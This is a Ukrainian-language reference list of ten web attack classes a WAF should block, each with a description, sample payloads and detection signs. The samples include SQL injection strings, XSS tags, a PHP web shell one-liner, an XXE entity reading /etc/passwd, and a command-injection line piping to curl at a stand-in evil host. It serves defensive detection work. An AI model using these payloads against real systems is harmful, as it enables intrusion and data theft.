Типові атаки, які WAF має зупиняти
=================================

1. SQL Injection (SQL-ін'єкція)
Опис:
- Атакуючий вставляє SQL-код у поля вводу, URL або параметри запиту.
- Мета — обійти авторизацію, прочитати або змінити дані в базі.

Приклади:
- ' OR '1'='1
- UNION SELECT username, password FROM users
- DROP TABLE users;
- admin'--

Чому WAF має зупиняти:
- такі рядки містять шаблони SELECT, UNION, DROP, OR/AND з порівняннями;
- це є класичними ознаками SQL-ін'єкцій.

2. XSS (Cross-Site Scripting)
Опис:
- Атакуючий впроваджує JavaScript у сторінку, яку бачать інші користувачі.
- Мета — викрасти cookie, виконати підробку дій або зламати сесію.

Приклади:
- <script>alert('xss')</script>
- <img src=x onerror=alert(1)>
- javascript:alert(1)
- <svg/onload=alert(1)>

Чому WAF має зупиняти:
- такі payload-и містять HTML-теги або JavaScript-схеми, які типові для XSS.

3. Path Traversal (проходження по файловій системі)
Опис:
- Атакуючий намагається піднятися вгору по файловій системі через шлях до файлу.
- Мета — отримати доступ до конфігурацій, секретів або інших файлів сервера.

Приклади:
- ../../etc/passwd
- ..\\..\\windows\\win.ini
- %2e%2e%2fetc%2fpasswd
- /var/www/html/config.php

Чому WAF має зупиняти:
- шаблони ../, ..\\, %2e%2e, /etc/passwd, /proc/self тощо є характерними для traversal.

4. Command Injection (ін'єкція команд)
Опис:
- Атакуючий вставляє оболонкові команди у параметри запиту.
- Мета — виконати системні команди на сервері.

Приклади:
- ; cat /etc/passwd
- && whoami
- | curl http://evil.example

Чому WAF має зупиняти:
- символи ;, |, &&, а також команди типу whoami, curl, cat є сильними ознаками.

5. Web Shell / Upload Abuse
Опис:
- Атакуючий намагається завантажити або виконати веб-шел або інший зловмисний код.

Приклади:
- <?php system($_GET['cmd']); ?>
- <form action="/upload" method="post">...</form>
- shell.php

Чому WAF має зупиняти:
- такі payload-и містять PHP/HTML шаблони, які часто використовуються для shell-ів.

6. SSRF (Server-Side Request Forgery)
Опис:
- Атакуючий змушує сервер робити запити до внутрішніх ресурсів.
- Мета — отримати доступ до localhost, метаданих хмарних сервісів або внутрішніх API.

Приклади:
- http://169.254.169.254/latest/meta-data/
- http://127.0.0.1:8080/admin
- http://localhost:22

Чому WAF має зупиняти:
- такі адреси вказують на внутрішні або приватні мережеві ресурси.

7. Open Redirect / Header Injection
Опис:
- Атакуючий намагається змусити користувача перейти на зловмисний сайт або підмінити заголовки HTTP.

Приклади:
- https://evil.example
- \r\nSet-Cookie: admin=true
- Location: https://phishing.example

Чому WAF має зупиняти:
- такі рядки можуть свідчити про перенаправлення або маніпуляцію заголовками.

8. XML / XXE-like payloads
Опис:
- Атакуючий використовує XML-структури для читання локальних файлів або виклику зовнішніх ресурсів.

Приклади:
- <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
- <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.example">]>

Чому WAF має зупиняти:
- XML-DOCTYPE, ENTITY, SYSTEM є типовими ознаками XXE-подібних атак.

9. Header Manipulation / Abuse
Опис:
- Атакуючий підміняє або маніпулює заголовками HTTP, наприклад Host, Referer, X-Forwarded-Host.

Приклади:
- X-Forwarded-Host: evil.com
- Referer: javascript:alert(1)
- Host: localhost@evil.example

Чому WAF має зупиняти:
- підозрілі заголовки можуть бути використані для обману app або логіки доступу.

10. Bot / Abuse patterns
Опис:
- Атакуючий здійснює масові або автоматизовані запити з метою перебору, сканування або DDoS-подібної активності.

Приклади:
- повторювані запити до /login з різними payload-ами;
- user-agent з ознаками сканера або ботів;
- великі серії однакових GET/POST запитів.

Чому WAF має зупиняти:
- такі патерни підвищують ризик автоматизованого зламу або перевантаження системи.
